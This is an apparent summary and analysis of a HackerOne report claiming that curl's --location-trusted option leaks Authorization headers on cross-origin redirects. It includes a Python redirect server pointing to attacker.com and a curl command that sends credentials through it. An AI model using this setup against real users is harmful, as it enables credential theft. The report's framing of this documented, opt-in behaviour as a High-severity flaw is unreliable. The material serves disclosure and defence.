# Authorization Header Leak via --location-trusted in Curl

## Metadata
- **Source:** HackerOne
- **Report:** 2946924 | https://hackerone.com/reports/2946924
- **Submitted:** 2025-01-18
- **Reporter:** voggerloops
- **Program:** Curl/libcurl
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Credential Exposure, Cross-Origin Information Disclosure, Improper Access Control, Authentication Header Leakage
- **CVEs:** None
- **Category:** uncategorised

## Summary
Curl's --location-trusted option forwards HTTP Authorization headers when following cross-origin redirects, exposing Basic Authentication credentials to untrusted domains. Unlike the default --location behavior which strips auth headers for security, --location-trusted bypasses this protection, allowing attackers controlling redirect endpoints to harvest credentials. This particularly impacts DevOps pipelines, CI/CD automation, and API clients that rely on basic authentication.

## Attack scenario
1. Attacker sets up a malicious HTTP server on a controlled domain that responds to requests with a 302 redirect to another attacker-controlled endpoint
2. Developer or automation script uses curl with --location-trusted flag combined with --user parameter containing credentials (e.g., basic auth tokens or API keys)
3. Curl makes initial request to attacker's redirect server, which responds with HTTP 302 Location header pointing to attacker's second domain
4. Due to --location-trusted flag, curl automatically follows redirect and forwards the Authorization header to the untrusted domain
5. Attacker captures the Authorization header containing base64-encoded credentials from HTTP request logs or packet capture
6. Attacker decodes credentials and uses them to access legitimate services, escalate privileges, or compromise downstream systems

## Root cause
The --location-trusted option in curl's redirect handling logic does not properly validate domain trust boundaries before forwarding sensitive HTTP headers. The implementation forwards Authorization headers across origin boundaries without warning or validation, conflicting with standard security practices that restrict authentication credentials to same-origin requests.

## Attacker mindset
An attacker would target organizations using curl in automation, particularly in DevOps/CI-CD pipelines where basic authentication is common. By controlling a single redirect endpoint (potentially via DNS hijacking, BGP hijacking, or compromised infrastructure), the attacker can passively harvest credentials from any curl clients using --location-trusted, gaining access to protected APIs, repositories, and internal services without active exploitation.

## Defensive takeaways
- Avoid using --location-trusted when authentication headers are involved; prefer manual redirect handling with header validation
- Implement header-stripping proxies or wrapper scripts around curl to prevent cross-origin credential leakage
- Replace Basic Authentication with token-based authentication (OAuth2, API tokens with scope restrictions) in automation scripts
- Use curl's --location (without --location-trusted) and manually validate redirect targets before following
- Implement Content Security Policy and authentication header restrictions at the application level
- Monitor and audit curl configurations in CI/CD pipelines and automation frameworks for insecure flags
- Educate developers about --location-trusted risks and prefer secure-by-default alternatives
- Consider using environment-specific credentials with minimal scope rather than privileged accounts in automation
- Implement network segmentation to limit exposure if credentials are compromised
- Use mTLS or certificate pinning instead of Basic Auth for service-to-service communication

## Variant hunting
Hunt for similar credential leakage patterns in other HTTP clients (wget, httpie, Python requests with allow_redirects), authentication header handling in proxy tools, and cross-origin redirect vulnerabilities in web frameworks. Examine other curl options that affect header forwarding behavior (--tlsuser, --proxy-user, --header). Check for similar issues in GraphQL clients, gRPC tools, and API testing frameworks that may inappropriately forward credentials across domain boundaries.

## MITRE ATT&CK
- T1190
- T1001
- T1589
- T1040
- T1528
- T1558

## Notes
This vulnerability is particularly dangerous in CI/CD contexts where curl scripts run with elevated privileges and network access. The --location-trusted flag appears designed for legitimate use cases but lacks adequate security defaults. The base64 encoding of Basic Auth credentials provides minimal obfuscation, making captured headers immediately usable. No evidence of active exploitation in wild, but risk is high given curl's ubiquity in automation. Curl maintainers should consider deprecating --location-trusted or requiring explicit user confirmation before forwarding credentials.

## Full report
<details><summary>Expand</summary>

Curl's --location-trusted Option Leaks Authorization Header Across Domains
The `--location-trusted` option in Curl forwards the Authorization header when following cross-origin redirects, exposing Basic Authentication credentials to untrusted hosts.

- If an attacker controls a redirecting endpoint, they can steal credentials from any requests using Basic Auth.
- Unlike `--location`, which strips authentication headers for security, `--location-trusted` forwards them without warning, leading to unintended  
credential leakage.
This violates authentication best practices and introduces a serious security risk

---

Affected Versions
Run:

curl -V

 **Example Output:**

curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.10 zlib/1.3.1
Release-Date: 2024-01-15

 **Tested on:**
-  Linux (Ubuntu 22.04)
-  macOS 14 Sonoma
-  Windows 11 (WSL2)

---
 ** Steps to Reproduce**

 **Start a Malicious Redirect Server**
Run this Python script on an attacker-controlled machine:
 python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", "http://attacker.com")
        self.end_headers()

server = HTTPServer(("0.0.0.0", 8080), RedirectHandler)
server.serve_forever()
```

 Run Curl with Authentication & --location-trusted
Execute:
curl -v -L --user "admin:password" --location-trusted http://localhost:8080
`

---

 Expected Behavior
- Curl should strip the Authorization header  when redirecting to a  different domain.

 Actual Behavior
- Curl forwards the Authorization header to `attacker.com`, exposing credentials.

---

Supporting Material / References
 Curl Debug Log (`-v --trace curl_trace.txt`) – Shows leaked Authorization header  
Packet Capture (`tcpdump`/Wireshark)– Confirms credentials are sent cross-origin  
 PoC Python Code (`redirect_poc.py`) – Reproduces the vulnerability locally  

---

 Impact: What an Attacker Can Achieve
 Credential Exposure:
- Any Basic Authentication credentials (API keys, admin passwords, cloud service tokens) are leaked if an attacker controls the redirect.

 Privilege Escalation:
- Attackers can gain unauthorized access to admin interfaces, APIs, or cloud services, leading to 
full system compromise

 DevOps & CI/CD Pipeline Risk:
- Automation scripts & DevOps pipelines using `curl` may unknowingly expose credentials to untrusted redirect targets

---

 Suggested Fix
 Immediate Workaround for Affected Users
Avoid`--location-trusted` when authentication is involved  
Manually follow redirects by parsing `curl -i` output  
Use API tokens instead of Basic Auth where possible  

 Permanent Fix for Curl Developers
Automatically strip Authorization headers for cross-origin redirect
Update documentation to warn users about risks of `--location-trusted` 
Display security warnings before forwarding authentication credentials  

---
Final Thoughts
This vulnerability exposes sensitive credentials to untrusted third parties, which can lead to **credential theft, account takeovers, and security breaches Fixing this issue will help protect automation scripts, CI/CD pipelines, and security-conscious developers from unintentionally leaking credentials.

## Impact

The location-trusted option in Curl forwards the Authorization header when following cross-origin redirects, exposing Basic Authentication credentials to untrusted hosts.

This behavior creates a security risk where an attacker controlling a redirecting endpoint can steal credentials from any request using Basic Auth. Unlike --location, which strips authentication headers for security reasons, --location-trusted forwards them without warning, leading to unintended credential leakage.

This issue violates authentication best practices and could lead to credential theft, privilege escalation, and security breaches, particularly affecting DevOps pipelines, automation scripts, and CI/CD environments that rely on Curl.

The recommended fix is to automatically strip Authorization headers for cross-origin redirects, warn users about the risks of --location-trusted, and update documentation to reflect this issue.

</details>

---
*Analysed by Claude on 2026-05-24*
